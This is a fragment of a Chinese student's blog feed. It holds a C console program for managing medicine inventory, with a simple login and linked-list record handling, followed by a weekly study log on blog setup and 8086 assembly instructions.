药品名称</span></span><br><span class="line">	<span class="keyword">double</span> price;<span class="comment">//价格</span></span><br><span class="line">	<span class="keyword">char</span> type[<span class="number">5</span>];<span class="comment">// 药品类型</span></span><br><span class="line">	<span class="keyword">int</span> prod;<span class="comment">//生产日期(年)</span></span><br><span class="line">	<span class="keyword">int</span> shelf;<span class="comment">//保质期(年)</span></span><br><span class="line">	<span class="keyword">int</span> stock;<span class="comment">//库存</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">med</span>* <span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">med</span> *<span class="title">p</span>;</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">menu</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;欢迎使用本管理系统\n&quot;</span> </span><br><span class="line">			<span class="string">&quot;选择一项功能:\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;1.录入信息\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;2.打印信息\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;3.保存信息\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;4.读取信息\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;5.统计药品总数\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;6.查找符合条件的药品\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;7.修改信息\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;8.删除信息\n&quot;</span></span><br><span class="line">	       <span class="string">&quot;9.退出\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(struct med *p)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sum</span><span class="params">(struct med *p)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">(struct med *p)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">(struct med *p)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify</span><span class="params">(struct med *p)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">user</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	system(<span class="string">&quot;color 70&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(user()!=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">continue</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">		menu();</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">		<span class="keyword">switch</span>(n) &#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:<span class="comment">//录入</span></span><br><span class="line">				build();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:<span class="comment">//打印</span></span><br><span class="line">				print(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:<span class="comment">//保存</span></span><br><span class="line">				save(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:<span class="comment">//读取</span></span><br><span class="line">				read();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">5</span>:<span class="comment">//统计人数</span></span><br><span class="line">				sum(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">6</span>:<span class="comment">//查找</span></span><br><span class="line">				find(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">7</span>:<span class="comment">//修改</span></span><br><span class="line">				modify(p);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">8</span>:<span class="comment">//删除</span></span><br><span class="line">				remove();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;Wrong num\n&quot;</span>);</span><br><span class="line">				getchar();</span><br><span class="line">				getchar();</span><br><span class="line">				system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">				<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">user</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;欢迎使用本系统，请先注册或登录：\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;1.注册/2.登录：&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	<span class="keyword">char</span> id[<span class="number">10</span>],pass[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;输入:用户名  密码:  (均只能为小于8位的字母或数字)&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s %s&quot;</span>,id,pass);</span><br><span class="line">		FILE* fp;</span><br><span class="line">		fp = fopen(<span class="string">&quot;.\\userinfo.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; id[i]!=<span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">			id[i]+=<span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; pass[i]!=<span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">			pass[i]+=<span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">fprintf</span>(fp,<span class="string">&quot;%s &quot;</span>,id);</span><br><span class="line">		<span class="built_in">fprintf</span>(fp,<span class="string">&quot;%s &quot;</span>,pass);</span><br><span class="line">		fclose(fp);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;保存成功\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(n==<span class="number">2</span>) &#123;</span><br><span class="line">		FILE *fp;</span><br><span class="line">		fp=fopen(<span class="string">&quot;.\\userinfo.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span>(fp==<span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;还未注册过&quot;</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;输入用户名: &quot;</span>);</span><br><span class="line">			<span class="keyword">char</span> a[<span class="number">10</span>],b[<span class="number">10</span>];</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,a);</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; a[i]!=<span class="string">&#x27;\0&#x27;</span>; i++) &#123;</span><br><span class="line">				a[i]+=<span class="number">2</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;输入密码：&quot;</span>);</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> g=<span class="number">0</span>; g&lt;<span class="number">10</span>; g++) &#123;</span><br><span class="line">				b[g]=getch();</span><br><span class="line">				<span class="keyword">if</span> (b[g]==<span class="string">&#x27;\x0d&#x27;</span>) &#123;</span><br><span class="line">					b[g]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				b[g]=b[g]+<span class="number">2</span>;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">while</span>(<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,id)==<span class="number">1</span>) &#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">strcmp</span>(id,a)==<span class="number">0</span>) &#123;</span><br><span class="line">					<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,pass);</span><br><span class="line">					<span class="keyword">if</span>(<span class="built_in">strcmp</span>(pass,b)==<span class="number">0</span>) &#123;</span><br><span class="line">						<span class="built_in">printf</span>(<span class="string">&quot;正在进入管理系统....&quot;</span>);</span><br><span class="line">						system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">						system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">						<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;用户名或密码错误&quot;</span>);</span><br><span class="line">			system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">			system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">med</span> *<span class="title">head</span>=</span><span class="literal">NULL</span>,*nextp;</span><br><span class="line">	<span class="keyword">if</span>(p!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">		head=p;</span><br><span class="line">		<span class="keyword">while</span>(head-&gt;next!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">			head=head-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;顺序输入药品的：编码  名称 价格 药品类型（处方药/非处方药） 生产日期（年） 保质期（年） 库存，-1结束\n&quot;</span>);</span><br><span class="line">	nextp=(struct med*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct med));</span><br><span class="line">	nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;elecode);</span><br><span class="line">	<span class="keyword">while</span>(nextp-&gt;elecode!=<span class="number">-1</span>) &#123;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s %lf %s %d %d %d&quot;</span>,nextp-&gt;name,&amp;nextp-&gt;price,nextp-&gt;type,&amp;nextp-&gt;prod,&amp;nextp-&gt;shelf,&amp;nextp-&gt;stock);</span><br><span class="line">		<span class="keyword">if</span>(head==<span class="literal">NULL</span>) &#123;</span><br><span class="line">			p=nextp;</span><br><span class="line">			head=p;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			head-&gt;next=nextp;</span><br><span class="line">			head=head-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		nextp=(struct med*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct med));</span><br><span class="line">		nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;elecode);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;成功录入,按回车返回&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(struct med *p)</span> </span>&#123;	</span><br><span class="line">	system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;编码     名称   价格    药品类型 生产日期（年） 保质期（年） 库存\n&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span>(p) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d     %s     %.2lf %5s %10d %10d %14d\n&quot;</span>,p-&gt;elecode,p-&gt;name,p-&gt;price,p-&gt;type,p-&gt;prod,p-&gt;shelf,p-&gt;stock);</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sum</span><span class="params">(struct med *p)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(p) &#123;</span><br><span class="line">		sum+=p-&gt;stock;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;药品种类：%d\n药品总量：%d&quot;</span>,i,sum);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//组合查询：stock&gt;10的</span></span><br><span class="line"><span class="comment">//单项查询：按编码  按价格区间</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">find</span><span class="params">(struct med *p)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;选择查询内容：\n1.库存小于10或可能在一年内过期的药\n2.按编码查询\n3.按价格区间查询\n&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="keyword">int</span> num;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">	<span class="keyword">if</span>(num==<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;今年是__年：    &quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;编码     名称   价格    药品类型 生产日期（年） 保质期（年） 库存\n&quot;</span>);</span><br><span class="line">		<span class="keyword">while</span>(p) &#123;</span><br><span class="line">			<span class="keyword">if</span>(p-&gt;stock&lt;<span class="number">10</span>||p-&gt;shelf-n&lt;<span class="number">2</span>)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d     %s     %.2lf %5s %10d %10d %14d\n&quot;</span>,p-&gt;elecode,p-&gt;name,p-&gt;price,p-&gt;type,p-&gt;prod,p-&gt;shelf,p-&gt;stock);</span><br><span class="line">				<span class="comment">//printf(&quot;%d %s %lf %s %d %d %d\n&quot;,p-&gt;elecode,p-&gt;name,p-&gt;price,p-&gt;type,p-&gt;prod,p-&gt;shelf,p-&gt;stock);</span></span><br><span class="line">			p=p-&gt;next; </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(num==<span class="number">2</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;输入编码：   &quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;名称   价格    药品类型 生产日期（年） 保质期（年） 库存\n&quot;</span>);</span><br><span class="line">		<span class="keyword">while</span>(<span class="number">1</span>) &#123;</span><br><span class="line">			<span class="keyword">if</span>(p-&gt;elecode==n) &#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			p=p-&gt;next;</span><br><span class="line">			<span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%s     %.2lf %5s %10d %10d %14d\n&quot;</span>,p-&gt;name,p-&gt;price,p-&gt;type,p-&gt;prod,p-&gt;shelf,p-&gt;stock);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Wrong Number\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(num==<span class="number">3</span>) &#123;</span><br><span class="line">		<span class="keyword">int</span> min,max;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;输入最低和最高价格，以空格分开：    &quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;min,&amp;max);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;编码     名称   价格    药品类型 生产日期（年） 保质期（年） 库存\n&quot;</span>);</span><br><span class="line">		<span class="keyword">while</span>(p) &#123;</span><br><span class="line">			<span class="keyword">if</span>(p-&gt;price&gt;=min&amp;&amp;p-&gt;price&lt;=max)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%d     %s     %.2lf %5s %10d %10d %14d\n&quot;</span>,p-&gt;elecode,p-&gt;name,p-&gt;price,p-&gt;type,p-&gt;prod,p-&gt;shelf,p-&gt;stock);</span><br><span class="line">			p=p-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;错误的选项\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">modify</span><span class="params">(struct med *p)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">int</span> num;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输入修改药品的编码:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">	<span class="keyword">while</span>(p) &#123;</span><br><span class="line">		<span class="keyword">if</span>(p-&gt;elecode!=num) &#123;</span><br><span class="line">			p=p-&gt;next;</span><br><span class="line">		&#125; <span class="keyword">else</span></span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(p==<span class="literal">NULL</span>)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;编码错误&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;输入修改药品信息:\n&quot;</span>);	</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;顺序输入药品的：名称 价格 药品类型（处方药/非处方药） 生产日期（年） 保质期（年） 库存\n&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%s %lf %s %d %d %d&quot;</span>,p-&gt;name,&amp;p-&gt;price,p-&gt;type,&amp;p-&gt;prod,&amp;p-&gt;shelf,&amp;p-&gt;stock);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;成功修改\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输入删除药品编码：&quot;</span>);</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;n);</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">med</span> *<span class="title">head</span>,*<span class="title">nextp</span>,*<span class="title">d</span>;</span></span><br><span class="line">	head=p;</span><br><span class="line">	nextp=p;</span><br><span class="line">	<span class="keyword">if</span>(head-&gt;elecode==n) &#123;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">		<span class="built_in">free</span>(head);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;成功删除&quot;</span>);</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">	head=head-&gt;next;</span><br><span class="line">		<span class="keyword">while</span>(head) &#123;</span><br><span class="line">			<span class="keyword">if</span>(head-&gt;elecode!=n) &#123;</span><br><span class="line">				head=head-&gt;next;</span><br><span class="line">				nextp=nextp-&gt;next;</span><br><span class="line">			&#125; <span class="keyword">else</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(head==<span class="literal">NULL</span>)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;错误编码&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			</span><br><span class="line">			nextp-&gt;next=head-&gt;next;</span><br><span class="line">			<span class="built_in">free</span>(head);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;成功删除&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	getchar();</span><br><span class="line">	getchar();</span><br><span class="line">	system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">(struct med *p)</span> </span>&#123;</span><br><span class="line">	FILE* fp;</span><br><span class="line">	fp = fopen(<span class="string">&quot;.\\medinfo.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">	<span class="keyword">while</span> (p) &#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(fp,<span class="string">&quot;%d %s %.2lf %s %d %d %d\n&quot;</span>,p-&gt;elecode,p-&gt;name,p-&gt;price,p-&gt;type,p-&gt;prod,p-&gt;shelf,p-&gt;stock);</span><br><span class="line"></span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(fp);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;保存成功\n&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	getchar();</span><br><span class="line">	system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(p!=<span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">med</span> *<span class="title">nextp</span>=</span>p-&gt;next;</span><br><span class="line">		<span class="built_in">free</span>(p);</span><br><span class="line">		<span class="keyword">while</span>(nextp) &#123;</span><br><span class="line">			p=nextp;</span><br><span class="line">			nextp=nextp-&gt;next;</span><br><span class="line">			<span class="built_in">free</span>(p);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	FILE *fp;</span><br><span class="line">	fp=fopen(<span class="string">&quot;.\\medinfo.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(fp==<span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;文件无法打开&quot;</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		struct med *nextp,*head;</span><br><span class="line">		head=<span class="literal">NULL</span>;</span><br><span class="line">		nextp=(struct med*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct med));</span><br><span class="line">		nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">while</span>(<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;elecode)==<span class="number">1</span>) &#123;</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,nextp-&gt;name);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%lf&quot;</span>,&amp;nextp-&gt;price);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%s&quot;</span>,&amp;nextp-&gt;type);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;prod);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;shelf);</span><br><span class="line">			<span class="built_in">fscanf</span>(fp,<span class="string">&quot;%d&quot;</span>,&amp;nextp-&gt;stock);</span><br><span class="line">			<span class="keyword">if</span>(head==<span class="literal">NULL</span>) &#123;</span><br><span class="line">				head=nextp;</span><br><span class="line">				p=head;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				head-&gt;next=nextp;</span><br><span class="line">				head=head-&gt;next;</span><br><span class="line">			&#125;</span><br><span class="line">			nextp=(struct med*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct med));</span><br><span class="line">			nextp-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		fclose(fp);</span><br><span class="line">	&#125;</span><br><span class="line">	getchar();</span><br><span class="line">	getchar();</span><br><span class="line">	system(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>作业</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.02.03-2020.02.09</title>
    <url>/7089.html</url>
    <content><![CDATA[<p>这周学得比较少因为刚把输入法从全拼换成双拼在练习打字…</p>
<h2 id="1-搞博客">1.搞博客</h2>
<ul>
<li>在博客里加入了点效果（小声 bb：以前觉得应该挺复杂的，其实有了轮子之后也就一行代码的事啊）<br>
参考：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1ZpbmNlbnRHYXJyZWF1L3BhcnRpY2xlcy5qcw==">https://github.com/VincentGarreau/particles.js<i class="fa fa-external-link-alt"></i></span> -了解了 GitHub 上博客的结构<br>
<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vRWFnbGVyeS9wLzUxMjYyNzkuaHRtbA==">使用 GitHub,Jekyll 打造自己的免费独立博客<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<span id="more"></span>
<h2 id="2-汇编语言学习">2.汇编语言学习</h2>
<h3 id="div-指令">div 指令</h3>
<ul>
<li>div 是除法指令 -除数：有 8 位和 16 位两种，在一个寄存器或内存单元中 -被除数：默认放在 ax 或 dx 和 ax 中<br>
如果除数为 8 位，则被除数为 16 位，默认放在 ax 中存放<br>
如果除数为 16 位，则被除数位 32 位，在 dx 和 ax 中存放，dx 存放高 16 位，ax 存放低 16 位 -结果：<br>
除数为 8 位（16^2-1=255)，al 储存商，ah 储存余数<br>
除数为 16 位(16^4-1=65535)，ax 储存商，dx 储存余数</li>
</ul>
<p>divbyteptrds:[0]含义：<br>
~(al)=(ax)/((ds)*16+0)的商<br>
(ah)=(ax)/((ds)*16+0)的余数</p>
<p>divwordptr[bx+si+8]含义：<br>
~(ax)=[(dx)*10000h+(ax)]/((ds)*16+(bx)+(si)+8)的商<br>
(dx)=[(dx)*10000h+(ax)]/((ds)*16+(bx)+(si)+8)的余数</p>
<h3 id="dd-指令">dd 指令</h3>
<ul>
<li>用 db 定义字节型数据</li>
<li>用 dw 定义字型数据</li>
<li>用 dd 定义 double（双字）型数据</li>
</ul>
<h3 id="dup">dup</h3>
<p>dup 是一个操作符，和 db、dw、dd 等数据定义伪指令配合使用，用来进行数据的重复<br>
db/dw/dd 重复次数 dup（重复的数据）</p>
<p>如：<br>
~db200dup（0）<br>
：定义了 200 个字节的 0<br>
db3dup（‘abc’）<br>
：定义了 9 个字节:‘abcabcabc’</p>
<h3 id="转移指令">转移指令</h3>
<p>指可以修改 ip 或同时修改 cs 和 ip 的指令</p>
<p>段内转移：只修改 ip<br>
~短转移：-128~127<br>
近转移：-32768~32767</p>
<h2 id="3-c-语言-学生成绩管理系统">3.c 语言-学生成绩管理系统</h2>
